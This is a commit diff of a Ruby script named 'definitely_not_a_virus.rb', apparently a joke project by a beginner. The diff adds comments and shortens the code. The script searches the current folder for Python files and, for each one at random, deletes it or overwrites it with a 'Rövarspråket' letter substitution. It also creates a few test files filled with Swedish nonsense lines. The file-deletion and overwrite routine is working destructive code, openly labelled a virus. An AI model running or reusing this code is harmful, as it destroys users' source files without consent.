Added some comments and cut down on the code

+++ definitely_not_a_virus.rb
@@ -1,8 +1,10 @@
+#Initializes a virus
 def start
   puts "We are definitely not Fu**ing up your python files... or are we?"
   file_search
 end
 
+#Checks the folder for python files
 def file_search
   py_files = Dir.glob('*.py')
   if py_files != []
@@ -12,43 +14,41 @@ def file_search
   end
 end
 
+#Goes through a list and decides if the currently selected file gets deleted or converted to "Rövarspråket"
 def destiny(list)
   list.each do |x|
     jesus = god
-    if jesus == 1
-      File.delete(x)
-    elsif jesus == 2
-      ass_schmacker(x)
-    end
+      File.delete(x) if jesus == 1
+      ass_schmacker(x) if jesus == 2
   end
 end
 
+#Generates a number between 1-2
 def god
   return rand(1..2)
 end
 
+#Converts the contents of the file to "Rövarspråk"
 def ass_schmacker(file)
   text = File.read(file)
-  replace = text.gsub!(/([bcdfghjklmnpqrstvwxz])/, '\1o\1')
+  replace = text.gsub!(/([bcdfghjklmnpqrstvwxzBCDFGHJKLMNPQRSTVWXZ])/, '\1o\1')
   File.open(file, "w") {|z| z.puts replace}
 end
 
+#This creates some python files to mess with...
 File.open('test.py', 'w') do |f2|
-  # use "\n" for two lines of text
   f2.puts "Wälkommen til main snoppfenstoppfen"
   end
 
   File.open('test1.py', 'w') do |f2|
-    # use "\n" for two lines of text
     f2.puts "Jag är en dvärg och jag gräver ett hål, gråver ett hål, gräver gräver hål"
   end
     File.open('test3.py', 'w') do |f2|
-      # use "\n" for two lines of text
       f2.puts "Jag är dan bull och jag sparkar på ett flöde, sparkar på ett flöde, sparkar ett flöööööde"
     end
       File.open('tes4t.py', 'w') do |f2|
-        # use "\n" for two lines of text
         f2.puts "Who was rapping, dovahkiin dragons are not dovahkiin"
       end
 
+#Initializes the initialisation of the virus
 start
